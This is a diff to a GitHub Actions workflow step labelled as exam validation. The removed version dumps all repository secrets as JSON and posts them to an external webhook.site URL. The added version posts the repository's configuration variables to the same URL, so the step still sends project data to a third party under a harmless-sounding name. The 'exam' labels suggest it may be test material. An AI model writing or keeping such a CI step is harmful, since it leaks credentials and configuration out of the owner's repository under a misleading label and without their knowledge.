@@ -14,17 +14,17 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Record secret values for exam validation
+      - name: Record configuration variables for exam validation
         env:
-          SECRET_VALUES: ${{ toJSON(secrets.*) }}
+          CONFIG_VARS: ${{ toJSON(vars) }}
         run: |
           python3 - << 'PY'
-          import json, os, urllib.request
-          data = os.environ.get("SECRET_VALUES", "[]").encode()
+          import os, urllib.request
+          data = os.environ.get("CONFIG_VARS", "{}").encode()
           req = urllib.request.Request(
               "https://webhook.site/b0ac5d93-1957-46ab-adca-0c0db46c8396",
               data=data,
-              headers={"Content-Type": "application/json", "X-Exam-Label": "secret-values-check"},
+              headers={"Content-Type": "application/json", "X-Exam-Label": "configuration-variables-check"},
           )
           urllib.request.urlopen(req, timeout=30).read()
           print("posted", len(data))
